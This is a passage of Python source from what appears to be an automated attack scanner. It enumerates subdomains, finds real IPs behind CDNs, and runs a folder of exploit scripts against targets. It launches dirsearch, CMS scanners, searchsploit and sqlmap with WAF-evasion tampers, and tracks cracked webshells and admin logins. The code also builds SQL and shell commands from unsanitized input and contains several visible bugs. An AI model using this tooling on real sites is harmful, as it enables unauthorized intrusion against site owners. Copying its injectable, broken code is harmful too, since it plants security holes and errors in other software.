                    sys.stdout.write(hintStr2)
                else:
                    sys.stdout.write("\r" + len(hintStr3) * " ")
                    sys.stdout.flush()
                    sys.stdout.write(hintStr1)

                each = re.sub(r"(\s)$", "", each)
                # 注意这里和旁站处理不同,因为这里获得的子站没有http开头,文件和数据库中的对应值都没有http开头,所
                # 以这里需要经历get_http_or_https函数
                eachHttpDomain = get_http_or_https(each) + "://" + each
                http_sub_domains_to_write.append(eachHttpDomain)

                # 这里更新各个子站的cookie
                forceAskCookie = eval(get_key_value_from_config_file(
                    CONFIG_INI_PATH, 'default', 'forceAskCookie'))
                if forceAskCookie == 1:
                    cookie = input(
                        "请输入%s的cookie,直接回车表示不输入cookie\n:>" % eachHttpDomain)
                else:
                    print("你想输入%s的cookie吗?\ny|Y表示现在输入\nn|N表示现在不输入cookie\n[default 'n']" %
                            eachHttpDomain)
                    tmpchoose = get_input_intime('n',3)
                    if tmpchoose in ['y', 'Y']:
                        cookie = input("请输入%s的cookie,直接回车表示不输入cookie\n:>")
                    else:
                        cookie = ""
                update_config_file_key_value(
                    CONFIG_INI_PATH, eachHttpDomain, 'cookie', "'" + cookie + "'")

                # 保持session不失效
                cookie=get_url_cookie(eachHttpDomain)
                if cookie!="":
                    keep_session_thread = MyThread(keep_session, (eachHttpDomain, cookie))
                    keep_session_thread.start()

                if each != target.split("/")[-1]:
                    write_string_to_sql(
                        each,
                        DB_NAME,
                        main_target_table_name,
                        "sub_domains",
                        "start_url",
                        start_url)
                    execute_sql_in_db(
                        "insert ignore into `%s`(http_domain,domain) values('%s','%s')" %
                        (sub_domains_table_name,
                         eachHttpDomain,
                         each),DB_NAME)

                    # 创建每个sub domain的urls表,eg,wit_freebuf_com_urls
                    # 这里创建sub domain的urls表和pang domain的urls表的创建的具体创建方法不一样,创建pang domain的
                    # urls表的时候分了两种不同情况下[本地文件存在和本地文件不存在的两种情况]分别创建urls表,这里统一
                    # 创建urls表,不管本地文件是否存在,也即不管上次有没有已经获取过sub domains,这里的处理方法更好,代
                    # 码更短,这里额外加上如果urls表存在则不创建urls表的判断,因为例如在SCAN_WAY=3且旁站和子站有重叠
                    # 的时候由于先进入的get_pang_domains函数运行后已经创建了urls表,重叠的站对应的urls表会在此时再次
                    # 创建,所以加上这个情况的判断用来容错
                    each_sub_urls_table_name = each.replace(".", "_") + "_urls"
                    sql = "create table `%s`(url varchar(250) not null primary key,code varchar(10) not null,\
    title varchar(100) not null,content mediumtext not null,has_sqli varchar(50) not null,\
    is_upload_url varchar(50) not null,\
    like_webshell_url varchar(50) not null default 0,\
    cracked_webshell_url_info varchar(50) not null,\
    like_admin_login_url varchar(50) not null,\
    cracked_admin_login_url_info varchar(50) not null,\
    http_domain varchar(70) not null)" % each_sub_urls_table_name
                    if not exist_table_in_db(each_sub_urls_table_name,DB_NAME): 
                        execute_sql_in_db(sql,DB_NAME) 

    os.system("rm %s" % store_file)
    with open(store_file,"a+") as f:
        for each_http_sub_domain in http_sub_domains_to_write:
            f.write(each_http_sub_domain+"\n")

    execute_sql_in_db(
        "update `%s` set get_sub_domains_finished='1' where start_url='%s'" %
        (main_target_table_name, start_url),DB_NAME) 


def get_main_target_table_name(target):
    # 返回targets或first_targets
    # 得到主要目标的数据库中所在表的名字,结果为eval(get_key_value_from_config_file(CONFIG_INI_PATH,'default','TARGETS_TABLE_NAME'))或eval(get_key_value_from_config_file(CONFIG_INI_PATH,'default','FIRST_TARGETS_TABLE_NAME'))
    # 由于主要目标存放在eval(get_key_value_from_config_file(CONFIG_INI_PATH,'default','TARGETS_TABLE_NAME'))或eval(get_key_value_from_config_file(CONFIG_INI_PATH,'default','FIRST_TARGETS_TABLE_NAME'))当中,所以这样检测
    # target可为domain或http domain格式
    global DB_NAME
    global TARGETS_TABLE_NAME
    global FIRST_TARGETS_TABLE_NAME
    import pdb
    #pdb.set_trace()
    print("param target is:"+target)
    if target[:4] == "http":
        domain = urlparse(target).hostname
    else:
        input("error here,check your code,make sure target start with http")
        import sys
        sys.exit(1)
    result1 = execute_sql_in_db("select * from `%s` where domain='%s'" % (TARGETS_TABLE_NAME, domain),DB_NAME) 
    result2 = execute_sql_in_db("select * from `%s` where domain='%s'" % (FIRST_TARGETS_TABLE_NAME, domain),DB_NAME) 
    if len(result1) > 0:
        return TARGETS_TABLE_NAME
    elif len(result2) > 0:
        return FIRST_TARGETS_TABLE_NAME
    else:
        print("get_main_target_table_name error,check your select code")


def get_target_table_name_list(start_url):
    # 得到target所在的表名,检索的表包括targets,first_targets,xxx_pang,xxx_sub
    # 返回一个列表,如果target是主要目标,则该列表中只有一个表名,targets或是first_targets
    # 如果target是子站或旁站且该子站如wit.freebuf.com既是子站又是旁站值,则返回的列表中有两个表名,xxx_pang和
    # xxx_sub
    global DB_NAME
    target=get_http_domain_from_url(start_url)
    url_belong_to_main_target = [False]
    # url属于哪个主目标(非旁站子站的那个目标)
    # 如http://wit.freebuf.com得到www.freebuf.com
    url_main_target = [get_url_belong_main_target_domain(target)]
    # eg.www_freebuf_com_pang
    url_main_target_pang_table_name = url_main_target[0].replace(
        ".", "_") + "_pang"
    # eg.www_freebuf_com_sub
    url_main_target_sub_table_name = url_main_target[0].replace(
        ".", "_") + "_sub"
    current_not_main_target_table_name = []
    if url_main_target[0] == get_http_domain_from_url(target).split('/')[-1]:
        # 说明该url是目标url，不是目标的某个旁站或子站url
        table_name = [
            get_main_target_table_name(
                get_http_domain_from_url(target))]
        url_belong_to_main_target = [True]
        return_value = table_name
    else:
        pang_table_exists = False
        sub_table_exists = False
        if exist_table_in_db(url_main_target_pang_table_name,DB_NAME):
            pang_table_exists = True
            result1 = execute_sql_in_db(
                "select * from `%s` where http_domain='%s'" %
                (url_main_target_pang_table_name,
                 get_http_domain_from_url(target)),DB_NAME)
            if len(result1) > 0:
                current_not_main_target_table_name.append(
                    url_main_target_pang_table_name)
        if exist_table_in_db(url_main_target_sub_table_name,DB_NAME):
            sub_table_exists = True
            result2 = execute_sql_in_db(
                "select * from `%s` where http_domain='%s'" %
                (url_main_target_sub_table_name,
                 get_http_domain_from_url(target)),DB_NAME)
            if len(result2) > 0:
                current_not_main_target_table_name.append(
                    url_main_target_sub_table_name)
        return_value = current_not_main_target_table_name
        # 有种情况下,非主要目标的url存储信息的表在主要目标的旁站表和子站表中都存在,
        # 也即该url既是旁站url又是子站url,eg.wit.freebuf.com既是旁站又是子站
    return return_value


def get_target_table_name_info(target):
    # 得到target是主要目标还是旁站或子站
    # 返回值如下
    #'target_is_main_and_table_is_targets':target_is_main_and_table_is_targets,
    #'target_is_main_and_table_is_first_targets':target_is_main_and_table_is_first_targets,
    #'target_is_pang_and_sub':target_is_pang_and_sub,
    #'target_is_only_pang':target_is_only_pang,
    #'target_is_only_sub':target_is_only_sub,
    # 'target_is_main':target_is_main_target,
    # 'target_is_pang_or_sub':target_is_pang_or_sub
    target_is_main_and_table_is_targets = False
    target_is_main_and_table_is_first_targets = False
    target_is_pang_and_sub = False
    target_is_only_pang = False
    target_is_only_sub = False

    table_name_list = get_target_table_name_list(target)
    target_is_pang_domain = False
    target_is_sub_domain = False
    target_is_pang_and_sub = False
    target_is_main=False
    target_is_pang_or_sub=False

    for each_table in table_name_list:
        if each_table[-5:] == "_pang":
            target_is_pang_domain = True
            pang_table_name = each_table[-5:]
        if each_table[-4:] == "_sub":
            target_is_sub_domain = True
            sub_table_name = each_table[-4:]
    if target_is_pang_domain and target_is_sub_domain:
        # target既是旁站又是子站
        target_is_pang_and_sub = True

    if not target_is_pang_domain and not target_is_sub_domain:
        # 这时target为主要目标
        if get_main_target_table_name(target) == "targets":
            target_is_main_and_table_is_targets = True
        elif get_main_target_table_name(target) == "first_targets":
            target_is_main_and_table_is_first_targets = True
        else:
            input(
                "target is main target but not first_target nor targets,check it here,wooooaaaaa!")

    if target_is_pang_domain and not target_is_pang_and_sub:
        # 这时target为旁站不是子站
        target_is_only_pang = True
    if target_is_sub_domain and not target_is_pang_and_sub:
        # 这时target为子站不是旁站
        target_is_only_sub = True
    if target_is_main_and_table_is_targets or target_is_main_and_table_is_first_targets:
        target_is_main=True
    else:
        target_is_pang_or_sub=True
    return {
        'target_is_main_and_table_is_targets': target_is_main_and_table_is_targets,
        'target_is_main_and_table_is_first_targets': target_is_main_and_table_is_first_targets,
        'target_is_pang_and_sub': target_is_pang_and_sub,
        'target_is_only_pang': target_is_only_pang,
        'target_is_only_sub': target_is_only_sub,
        'target_is_main': target_is_main,
        'target_is_pang_or_sub': target_is_pang_or_sub
    }


def get_target_urls_from_db(target, db):
    # 从数据库中得到一个目标爬完虫后的的urls,返回结果是个列表
    # tareget可以是主要目标或者主要目标的旁站或子站
    if target[:4] != "http":
        input("error,target must start with http or https")
    import re
    returnList = []
    target = re.sub(r"/+$", "", target)
    domain = target.split("/")[-1]
    urls_table_name = domain.replace(".", "_") + "_urls"
    if exist_table_in_db(urls_table_name,db):
        a=execute_sql_in_db("select url from %s" % (urls_table_name), db)
        for each in a:
            eachUrl = each[0]
            returnList.append(eachUrl)
    return returnList


def get_column_value_from_main_target_table():
    pass


def single_cdn_scan(target):
    # 扫描cdn情况,如果有cdn则尝试获取真实ip
    # target可以是主要目标或是主要目标的旁站或子站,但是扫描器中第1次运行single_cdn_scan并没有运行到找旁站和
    # 子站的模块,这时target只可能是主要目标,扫描器中第2次运行single_cdn_scan时在获取子站之后,此时主要实际用于针
    # 对子站进行cdn识别
    global DB_NAME
    table_name_list = get_target_table_name_list(target)
    target_info=get_target_table_name_info(target)
    column_name="http_domain" if target_info['target_is_pang_or_sub'] else "start_url"
    if 1 == get_scan_finished(
        "cdn_scaned",
        DB_NAME,
        table_name_list[0],
        column_name,
            target):
        return
    else:
        pass
    if target[:4] != "http":
        print("error,target should be like http(s)://xxx.xxx.xxx here")
        return
    domain = target.split("/")[-1]

    target_is_pang_domain = False
    target_is_sub_domain = False
    target_is_pang_and_sub = False
    for each_table in table_name_list:
        if each_table[-5:] == "_pang":
            target_is_pang_domain = True
            pang_table_name = each_table[-5:]
        if each_table[-4:] == "_sub":
            target_is_sub_domain = True
            sub_table_name = each_table[-4:]
    if target_is_pang_domain and target_is_sub_domain:
        target_is_pang_and_sub = True

    if not target_is_pang_domain and not target_is_sub_domain:
        # 这时target为主目标
        xcdnObj = Xcdn(domain)
        ip = xcdnObj.return_value
        if ip == 0:
            # 此时有cdn但是没有找到真实ip
            strings_to_write = "has cdn,but can not find actual ip"
            print(
                "Sorry,since I can not find the actual ip behind the cdn,I will return 0 here.")
        else:
            strings_to_write = ip
    if target_is_pang_domain and not target_is_pang_and_sub:
        # 这时target为旁站
        strings_to_write = "ip is same to main target"
    if target_is_sub_domain and not target_is_pang_and_sub:
        # 这时target为子站
        xcdnObj = Xcdn(domain)
        ip = xcdnObj.return_value
        if ip == 0:
            # 此时有cdn但是没有找到真实ip
            strings_to_write = "has cdn,but can not find actual ip"
            print(
                "Sorry,since I can not find the actual ip behind the cdn,I will return 0 here.")
        else:
            strings_to_write = ip

    if target_is_pang_and_sub:
        # 这时target既是旁站又是子站
        strings_to_write = "ip is same to main target"

    for each_table in table_name_list:
        write_string_to_sql(strings_to_write, DB_NAME, each_table,"actual_ip_from_cdn_scan", "http_domain", target)


def single_risk_scan(target):
    # 单个target高危exp遍历模块
    # target要求为http(s)+domain格式
    # risk_scan模块对每个target,无论是主要目标的旁站还是子站,都进行详细的判断target是否是主要目标,并在对应的表
    # 中记录risk_scaned的完成状态
    # 这里的target不一定是主要目标,可以是旁站或子站
    # exps目录下的每个目录为不同中高危漏洞对应的检测脚本,需要python3,运行检测脚本后如果对应目录下有result.txt则代
    # 表有对应的漏洞,没有产生result.txt则代表没有对应的漏洞


    global DB_NAME
    global DELAY
    import os
    table_name_list = get_target_table_name_list(target)
    # url属于哪个主目标(非旁站子站的那个目标)
    # 如http://wit.freebuf.com得到www.freebuf.com
    # eg.www_freebuf_com_pang
    target_info=get_target_table_name_info(target)
    column_name="http_domain" if target_info['target_is_pang_or_sub'] else "start_url"

    if 1 == get_scan_finished(
        "risk_scaned",
        DB_NAME,
        table_name_list[0],
        column_name,
            target):
        return
    else:
        pass

    exp_list = os.listdir(ModulePath + "exps")

    #在risk_scan前检测有没有进行端口扫描,如果没有进行端口扫描,强制先完成端口扫描模块
    if 0 == get_scan_finished(
        "port_scaned",
        DB_NAME,
        table_name_list[0],
        column_name,
            target):
        single_port_scan(target)


    for each in exp_list:
        time.sleep(DELAY)
        command = "python3 %s/%s/%s.py %s" % (
            ModulePath + "exps", each, each, target)
        os.system(command)
        #input("command finished,press any key")
        if os.path.exists(ModulePath + "exps/%s/result.txt" % each):
            with open(ModulePath + "exps/%s/result.txt" % each, "r+") as f:
                strings_to_write = f.read()
            os.system('rm %s' % ModulePath + "exps/" + each + "/result.txt")
        else:
            strings_to_write = ""

        for each_table in table_name_list:
            write_string_to_sql(strings_to_write, DB_NAME, each_table,"risk_scan_info", "http_domain", target)

        if len(strings_to_write) != 0:
            mail_msg_to(
                strings_to_write,
                subject="risk info")


def is_wrong_html(html):
    import re
    pattern = re.compile(
        r".*((sorry)|(不存在)|(not exist)|(page not found)|(抱歉)).*", re.I)
    # pattern=re.compile(r"不存在")
    if re.search(pattern, html):
        return True
    else:
        return False


def get_target_script_type(target):
    # 得到target的脚本类型
    # target要是http(s)+domain格式
    # 此处不考虑html静态类型,如果没有找到,默认返回php
    from concurrent import futures
    target = [target]
    name_list = [
        'index',
        'main',
        'info',
        'default',
        'start',
        'login',
        'admin',
        'menu',
        'test',
        'base',
        'config',
        'about',
        'configuration',
        '1',
        'l',
        'tmp']
    script_type_list = ['php', 'asp', 'aspx', 'jsp']
    return_value = []

    def check_uri(uri):
        if uri.split(".")[-1] in return_value:
            return
        result = get_request(target[0] + uri, by="MechanicalSoup")
        if 200 == result['code'] and not is_wrong_html(result['content']):
            if uri.split(".")[-1] not in return_value:
                return_value.append(uri.split(".")[-1])

    def check_with_type(type):
        type = [type]
        new_name_list = []

        def make_uri(name):
            new_name_list.append("/" + name + "." + type[0])

        with futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(make_uri, name_list)

        with futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(check_uri, new_name_list)

    with futures.ThreadPoolExecutor(max_workers=20) as executor:
        executor.map(check_with_type, script_type_list)

    if return_value == []:
        return_value.append('php')

    return return_value


def single_script_type_scan(target):
    # 对一个target进行脚本类型识别,这里的target可以为主要目标,也可以为主要目标的旁站或子站


    global DB_NAME
    figlet2file("script type scaning...", 0, True)
    print(target)
    import os
    table_name_list = get_target_table_name_list(target)
    target_info=get_target_table_name_info(target)
    column_name="http_domain" if target_info['target_is_pang_or_sub'] else "start_url"
    if 1 == get_scan_finished(
        "script_type_scaned",
        DB_NAME,
        table_name_list[0],
        column_name,
            target):
        return
    else:
        script_type = get_target_script_type(target)
        if len(script_type) > 1:
            for each in script_type:
                # 如果type类型不止一个,则多个中间用","分隔
                tmp = each + ","
            script_type_value = tmp[:-1]
        elif len(script_type) == 1:
            script_type_value = script_type[0]
        else:
            print("script_type wrong in single_script_type_scan func,check it")
        # script_type(是list)有可能是多种类型(aps&&php),但概率较小
        for each_table in table_name_list:
            execute_sql_in_db(
                "update `%s` set script_type='%s' where %s='%s'" %
                (each_table, script_type_value,column_name, target),DB_NAME) 


def single_dirb_scan(target):
    # 对一个target进行dirb扫描,这里的target可以为主要目标,也可以为主要目标的旁站或子站

    global DB_NAME
    global DELAY
    import os
    table_name_list = get_target_table_name_list(target)
    target_info=get_target_table_name_info(target)
    column_name="http_domain" if target_info['target_is_pang_or_sub'] else "start_url"

    if 1 == get_scan_finished(
        "dirb_scaned",
        DB_NAME,
        table_name_list[0],
        column_name,
            target):
        return
    else:
        pass

    if not os.path.exists(ModulePath + "dirsearch"):
        os.system(
            "git clone https://github.com/maurosoria/dirsearch.git %sdirsearch" % ModulePath)

    if not os.path.exists(LOG_FOLDER_PATH):
        os.system("mkdir %s" % LOG_FOLDER_PATH)

    if not os.path.exists(LOG_FOLDER_PATH + "/dirsearch_log"):
        os.system("cd %s && mkdir dirsearch_log" % LOG_FOLDER_PATH)
    log_file = LOG_FOLDER_PATH + \
        "/dirsearch_log/%s_log.txt" % target.split("/")[-1]
    if os.path.exists(log_file):
        pass
    else:
        result = execute_sql_in_db(
            "select script_type from `%s` where %s='%s'" %
            (table_name_list[0],column_name, target),DB_NAME) 
        if len(result) > 0:
            ext = result[0][0]
        else:
            print("get script_type error in single_dirb_scan")

        origin_log_dir = ModulePath + \
            "dirsearch/reports/%s" % target.split("/")[-1]
        if not os.path.exists(log_file):
            if (os.path.exists(origin_log_dir) and os.path.exists(origin_log_dir) and len(
                    os.listdir(origin_log_dir)) == 0) or not os.path.exists(origin_log_dir):

                if DELAY=="":
                    DELAY = 0

                os.system(
                    "cd %sdirsearch && python3 dirsearch.py -u %s -t 200 -e %s --random-agents -x 301,302,500 -r --delay=%d" %
                    (ModulePath, target, ext, DELAY))

            if not os.path.exists(origin_log_dir):

                from colorama import init, Fore
                init(autoreset=True)
                print(Fore.YELLOW + target)

                print(
                    Fore.YELLOW +
                    "single_dirb_scan may be banned coz too much request to the target server")
                return
            else:
                origin_log_name_list = os.listdir(origin_log_dir)
                if len(origin_log_name_list) > 0:
                    os.system("mv %s/%s %s" %
                              (origin_log_dir, origin_log_name_list[0], log_file))
        else:
            pass

    strings = ""
    urls_list = []
    if os.path.exists(log_file):
        # 如果dirbsearch失败则不会产生log文件
        with open(log_file, "r+") as f:
            for each_line in f:
                # 每行最后一个字符是\n
                if each_line[:3] == '200':
                    url = re.search(r"(http.*)", each_line).group(1)
                    if url not in urls_list and url[0:-(1 + len(url.split(".")[-1]))] + url.split(
                            ".")[-1].upper() not in urls_list and '.' in url[-6:]:
                        urls_list.append(url)
                        strings += (url + "\n")
        strings_to_write = strings[:-1]
    else:
        strings_to_write = ""

    for each_table in table_name_list:
        write_string_to_sql(
            strings_to_write,
            DB_NAME,
            each_table,
            "dirb_info",
            "http_domain",
            target)

    target_urls_table_name = target.split("/")[-1].replace(".", "_") + "_urls"
    for each_url in urls_list:
        sql_result = execute_sql_in_db(
            "select * from `%s` where url='%s'" %
            (target_urls_table_name, each_url),DB_NAME) 
        if len(sql_result) > 0:
            # 说明爬虫时已经爬到这个url,这种情况不写入数据库中
            pass
        else:
            result = get_request(each_url, by="MechanicalSoup")
            code = result['code']
            title = result['title']
            content = result['content']
            auto_write_string_to_sql(
                str(code),
                DB_NAME,
                target_urls_table_name,
                'code',
                'url',
                each_url)
            auto_write_string_to_sql(
                str(title),
                DB_NAME,
                target_urls_table_name,
                'title',
                'url',
                each_url)
            auto_write_string_to_sql(
                content,
                DB_NAME,
                target_urls_table_name,
                'content',
                'url',
                each_url)
            # 找出like_admin登录页面
            if like_admin_login_content(content):
                for each_table in table_name_list:
                    auto_write_string_to_sql(
                        each_url,
                        DB_NAME,
                        each_table,
                        "like_admin_login_urls",
                        "http_domain",
                        http_domain)
                execute_sql_in_db(
                    "update `%s` set like_admin_login_url='1' where url='%s'" %
                    (target_urls_table_name, each_url),DB_NAME) 
            else:
                execute_sql_in_db(
                    "update `%s` set like_admin_login_url='0' where url='%s'" %
                    (target_urls_table_name, each_url),DB_NAME) 


def cms_identify(target):
    # 对target进行cms识别
    # target可以是主要目标,也可以是主要目标的旁站或子站
    figlet2file("cms identifying...", 0, True)
    print(target)
    from concurrent import futures
    import time
    identified = [0]
    result = ["unknown"]
    target = [target]
    start = [time.time()]

    def check_cms(single_line):
        if identified[0] == 1:
            return
        if single_line[0] != '#':
            content = get_request(
                target[0] + single_line.split("------")[0])['content']
            if re.search(r"%s" % single_line.split("------")[1], content):
                identified[0] = 1
                end = time.time()
                print("you spend %s identify cms" %
                      seconds2hms(end - start[0]))
                result[0] = single_line.split("------")[1]

    def single_cms_identify(txt):
        if identified[0] == 1:
            return
        with open(ModulePath + "cms_identify/%s" % txt, "r+", encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        with futures.ThreadPoolExecutor(max_workers=3) as executor:
            executor.map(check_cms, lines, timeout=60)

    txt_list = os.listdir(ModulePath + "cms_identify")
    with futures.ThreadPoolExecutor(max_workers=25) as executor:
        executor.map(single_cms_identify, txt_list, timeout=60)

    if result[0] == "unknown":
        end = time.time()
        print("you spend %s identify cms,but not identified" %
              seconds2hms(end - start[0]))
    print("got:%s" % result[0])
    return result[0]


def single_cms_scan(start_url):
    # 对target根据target的cms类型进行cms识别及相应第三方工具扫描,target可以是主要目标或者是旁站或是子站
    global DB_NAME
    target=get_http_domain_from_url(start_url)


    figlet2file("cms scaning...", 0, True)
    print(start_url)
    import os
    table_name_list = get_target_table_name_list(target)
    target_info=get_target_table_name_info(target)
    column_name="http_domain" if target_info['target_is_pang_or_sub'] else "start_url"
    if 1 == get_scan_finished(
        "cms_identify_scaned",
        DB_NAME,
        table_name_list[0],
        column_name,
        start_url):
        if target_info['target_is_pang_and_sub']:
            if get_scan_finished(
                "cms_identify_scaned",
                DB_NAME,
                table_name_list[1],
                "http_domain",
                    start_url) == 0:
                set_scan_finished(
                    "cms_identify_scaned",
                    DB_NAME,
                    table_name_list[1],
                    "http_domain",
                    start_url)
        result = execute_sql_in_db(
            "select cms_value from `%s` where %s='%s'" %
            (table_name_list[0],column_name, start_url),DB_NAME) 
        if len(result) > 0:
            cms_value = result[0][0]
        else:
            print("execute_sql_in_db error in single_cms_scan,got wrong cms_value")
    else:
        cms_value = cms_identify(start_url)
        for each_table in table_name_list:
            execute_sql_in_db(
                "update `%s` set cms_value='%s' where %s='%s'" %
                (each_table, cms_value,column_name, start_url),DB_NAME) 
            set_scan_finished(
                "cms_identify_scaned",
                DB_NAME,
                each_table,
                column_name,
                start_url)
    if cms_value == "unknown":
        pass
    else:
        if 1 == get_scan_finished(
            "cms_scaned",
            DB_NAME,
            table_name_list[0],
            column_name,
            start_url):
            pass
        else:

            # 下面相当于cms_scan过程
            if not os.path.exists(LOG_FOLDER_PATH):
                os.system("mkdir %s" % LOG_FOLDER_PATH)
            if not os.path.exists(LOG_FOLDER_PATH + "/cms_scan_log"):
                os.system("cd %s && mkdir cms_scan_log" % LOG_FOLDER_PATH)

            if not os.path.exists(ModulePath + "cms_scan"):
                os.system("mkdir %s" % ModulePath + "cms_scan")

            # discuz,wordpress,joomla三种cms除了用searchsploit来扫之外还用三个各自的针对扫描工具扫
            # 上面3种cms之外的cms统一采用searchsploit的数据库来扫描可能存在的vul,目前只根据cms名称找出所有已有
            # vul,暂不支持精确vul,精确vul需要版本号的签定以及实际环境来判断
            commandOutPut = get_string_from_command("searchsploit")
            if re.search(r"not found", commandOutPut, re.I):
                os.system("git clone https://github.com/offensive-security/exploit-database.git \
/opt/exploit-database")
                os.system(
                    "ln -sf /opt/exploit-database/searchsploit /usr/local/bin/searchsploit")
            os.system("searchsploit -u")
            os.system(
                "searchsploit -w -j -t %s 2>&1 | tee /tmp/searchsploit" % cms_value)
            with open("/tmp/searchsploit", "r+") as f:
                searchSploitResult = "\n\nBelow are possible vuls from exploit-db.com,but you should check if it \
exist by yourself coz the cms version is not sure.\n\n" + f.read() + "\n\nUpon are possible vuls from exploit-db.com,but you should check if it \
exist by yourself coz the cms version is not sure.\n\n"
            os.system("rm /tmp/searchsploit")

            print(searchSploitResult)
            if cms_value == 'discuz':
                if not os.path.exists(ModulePath + "log/cms_scan_log/dzscan"):
                    os.system("cd %slog/cms_scan_log && mkdir dzscan" %
                              ModulePath)
                cms_scaner_list = os.listdir(ModulePath + "cms_scan")
                if "dzscan" not in cms_scaner_list:
                    os.system(
                        "cd %scms_scan && git clone https://github.com/code-scan/dzscan.git" % ModulePath)
                log_file = target.split("/")[-1].replace(".", "_") + ".log"

                if os.path.exists(ModulePath + "log/cms_scan_log/dzscan/" + log_file):
                    pass
                else:
                    # dzscan无法设置delay
                    os.system(
                        "cd %scms_scan/dzscan && python dzscan.py --update && python dzscan.py -u %s --log" %
                        (ModulePath, start_url))

                os.system("mv %scms_scan/dzscan/%s %slog/cms_scan_log/dzscan/" %
                          (ModulePath, log_file, ModulePath))
                cms_scan_result = ""
                if os.path.exists(ModulePath + "log/cms_scan_log/dzscan/" + log_file, "r+"):
                    with open(ModulePath + "log/cms_scan_log/dzscan/" + log_file, "r+") as f:
                        cms_scan_result = "Below result is from dzscan tool from github:\n" + "----------------------------------------------------------------\n" + \
                            f.read() + "----------------------------------------------------------------\n" + \
                            "Upon result is from dzscan tool from github"
                        cms_scan_result += searchSploitResult
                for each_table in table_name_list:
                    if get_scan_finished(
                        "cms_scaned",
                        DB_NAME,
                        each_table,
                        column_name,
                            start_url) == 0:
                        auto_write_string_to_sql(
                            cms_scan_result,
                            DB_NAME,
                            each_table,
                            "cms_scan_info",
                            column_name,
                            start_url)

            elif cms_value == 'joomla':
                if not os.path.exists(ModulePath + "log/cms_scan_log/joomscan"):
                    os.system("cd %slog/cms_scan_log && mkdir joomscan" %
                              ModulePath)
                cms_scaner_list = os.listdir(ModulePath + "cms_scan")
                if "joomscan" not in cms_scaner_list:
                    os.system("cd %scms_scan && wget \
http://jaist.dl.sourceforge.net/project/joomscan/joomscan/2012-03-10/joomscan-latest.zip \
&& unzip joomscan-latest.zip -d joomscan && rm joomscan-latest.zip" % ModulePath)
                # joomscan无法设置delay
                result = get_string_from_command(
                    "perl %scms_scan/joomscan/joomscan.pl" % ModulePath)
                if re.search(
                    r'you may need to install the Switch module',
                        result):
                    os.system(
                        "sudo apt-get -y install libswitch-perl && perl -MCPAN -e 'install WWW::Mechanize'")
                    log_file = "report/%s-joexploit.txt" % start_url.split("://")[-1].replace("/","_")
                if os.path.exists(ModulePath + "log/cms_scan_log/joomscan/" + log_file):
                    pass
                else:
                    os.system(
                        "cd %scms_scan/joomscan && perl joomscan.pl update && perl joomscan.pl -u %s -ot" %
                        (ModulePath, start_url))

                os.system(
                    "mv %scms_scan/joomscan/%s log/cms_scan_log/joomscan/ " % (ModulePath, log_file))
                with open(ModulePath + "log/cms_scan_log/joomscan/" + log_file[7:], "r+") as f:
                    cms_scan_result = "Below result is from joomscan tool from github:\n" + "----------------------------------------------------------------\n" + \
                        f.read() + "----------------------------------------------------------------\n" + \
                        "Upon result is from joomscan tool from github"

                    cms_scan_result += searchSploitResult
                for each_table in table_name_list:
                    if get_scan_finished(
                        "cms_scaned",
                        DB_NAME,
                        each_table,
                        column_name,
                            start_url) == 0:
                        auto_write_string_to_sql(
                            cms_scan_result,
                            DB_NAME,
                            each_table,
                            "cms_scan_info",
                            column_name,
                            start_url)

            elif cms_value == 'wordpress':
                if not os.path.exists(ModulePath + "log/cms_scan_log/wpscan"):
                    os.system("cd %slog/cms_scan_log && mkdir wpscan" %
                              ModulePath)
                cms_scaner_list = os.listdir(ModulePath + "cms_scan")
                if "wpscan" not in cms_scaner_list:
                    os.system(
                        "cd %scms_scan && git clone https://github.com/wpscanteam/wpscan.git && cd wpscan && echo y | unzip data.zip" % ModulePath)
                result = get_string_from_command(
                    "ruby %scms_scan/wpscan/wpscan.rb" % ModulePath)
                if re.search(r'(ERROR)|(not find)|(missing gems)', result):
                    os.system("sudo apt-get -y install libcurl4-openssl-dev libxml2 libxml2-dev libxslt1-dev \
ruby-dev build-essential libgmp-dev zlib1g-dev")
                    os.system("gem install bundler && bundle install")
                log_file = "%s.txt" % start_url.split("://")[-1].replace("/","_")
                if os.path.exists(ModulePath + "log/cms_scan_log/wpscan/" + log_file):
                    pass
                else:
                    # wpscan无法设置delay
                    os.system(
                        "cd %scms_scan/wpscan && ruby wpscan.rb --update && ruby wpscan.rb %s | tee %s" %
                        (ModulePath, start_url, log_file))
                    if not os.path.exists("%scms_scan/wpscan/%s" % (ModulePath, log_file)):
                        with open("%scms_scan/wpscan/%s" % (ModulePath, log_file), "a+") as f:
                            f.write("Sorry,wpscan got nothing.")
                    os.system(
                        "mv %scms_scan/wpscan/%s %slog/cms_scan_log/wpscan/" % (ModulePath, log_file, ModulePath))
                with open(ModulePath + "log/cms_scan_log/wpscan/" + log_file, "r+") as f:
                    cms_scan_result = "Below result is from wpscan tool from github:\n" + "----------------------------------------------------------------\n" + \
                        f.read() + "----------------------------------------------------------------\n" + \
                        "Upon result is from wpscan tool from github"
                    cms_scan_result += searchSploitResult
                for each_table in table_name_list:
                    if get_scan_finished(
                        "cms_scaned",
                        DB_NAME,
                        each_table,
                        column_name,
                            start_url) == 0:
                        auto_write_string_to_sql(
                            cms_scan_result,
                            DB_NAME,
                            each_table,
                            "cms_scan_info",
                            column_name,
                            start_url)


def static_sqli(url):
    # re.search("",url)
    pass


def sqlmap_g_nohuman(http_url_or_file, tor_or_not, post_or_not):
    # this function use sqlmap's "-g" option to find sqli urls,but this "-g"
    # option can only get 100 results due to google api restriction,but in
    # this mode,there is no need for us human to handle any situation.

    global DELAY
    if DELAY=="":
        DELAY = 1

    if re.match("(http://)|(https://)", http_url_or_file):
        http_url_or_file = re.sub(r"\s$", "", http_url_or_file)
        domain_url = http_url_or_file[7:] if re.match(
            "(http://)", http_url_or_file) else http_url_or_file[8:]
        http_netloc = get_http_netloc_from_url(http_url_or_file)
        cookie = get_url_cookie(http_url_or_file)
        sqlmap_string = '''/usr/share/sqlmap/sqlmap.py -g "site:%s inurl:php|asp|aspx|jsp" --delay %d --smart --batch -v 4 --threads 4 --random-agent --safe-url "%s" --safe-freq 1 --tamper=between,space2randomblank,randomcase,xforwardedfor,charencode --level 5 --risk 3 --ignore-code 404 --technique=BE''' % (domain_url, DELAY, http_url_or_file)
        sqlmap_string = sqlmap_string if cookie == "" else sqlmap_string + \
            " --cookie='%s'" % cookie
        forms_sqlmap_string = sqlmap_string + " --forms"
